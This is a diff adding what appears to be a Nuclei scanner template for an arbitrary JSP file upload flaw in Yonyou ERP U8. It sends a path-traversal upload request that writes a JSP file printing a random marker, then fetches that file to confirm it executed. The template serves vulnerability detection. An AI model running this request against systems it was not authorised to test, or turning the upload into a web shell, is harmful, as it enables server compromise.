@@ -1,0 +1,57 @@
+id: yonyou-erp-u8-uploadfiledata-writefile
+
+info:
+  name: Yonyou ERP U8 Arbitrary File Upload
+  author: ProjectDiscoveryAI
+  severity: critical
+  description: |
+    This template checks for an arbitrary file upload vulnerability in Yonyou ERP U8 systems. The vulnerability allows attackers to upload JSP files and execute arbitrary scripts on the server.
+  reference:
+    - http://wiki.peiqi.tech/wiki/oa/%E7%94%A8%E5%8F%8BOA/%E7%94%A8%E5%8F%8B%20GRP-U8%20UploadFileData%20%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E.html
+
+variables:
+  randomBoundary: '{{rand_text_alphanumeric(8)}}'
+  randomFilename: '{{rand_text_alphanumeric(6)}}'
+  uniqueIdentifier: '{{md5(rand_text_alphanumeric(16))}}'
+
+http:
+  - id: file-upload
+    method: POST
+    path:
+      - '{{BaseURL}}/UploadFileData?action=upload_file&filename=../.{{randomFilename}}.jsp'
+    headers:
+      Content-Type: 'multipart/form-data; boundary=----WebKitFormBoundary{{randomBoundary}}'
+    body: |
+      ------WebKitFormBoundary{{randomBoundary}}
+      Content-Disposition: form-data; name="upload"; filename="{{randomFilename}}.jsp"
+      Content-Type: application/octet-stream
+
+      <% {out.print("{{uniqueIdentifier}}");} %>
+      ------WebKitFormBoundary{{randomBoundary}}
+      Content-Disposition: form-data; name="submit"
+
+      submit
+      ------WebKitFormBoundary{{randomBoundary}}--
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: body
+        words:
+          - showSucceedMsg
+
+  - id: file-verification
+    method: GET
+    path:
+      - '{{BaseURL}}/R9iPortal/.{{randomFilename}}.jsp'
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: body
+        words:
+          - '{{uniqueIdentifier}}'
